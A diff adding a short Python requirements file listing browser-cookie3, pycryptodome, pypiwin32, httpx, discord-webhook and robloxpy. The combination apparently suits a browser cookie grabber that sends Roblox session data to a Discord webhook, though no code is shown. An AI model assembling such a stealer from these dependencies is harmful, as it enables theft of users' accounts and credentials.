@@ -1,0 +1,6 @@
+pycryptodome
+browser-cookie3
+pypiwin32
+httpx
+discord-webhook
+robloxpy
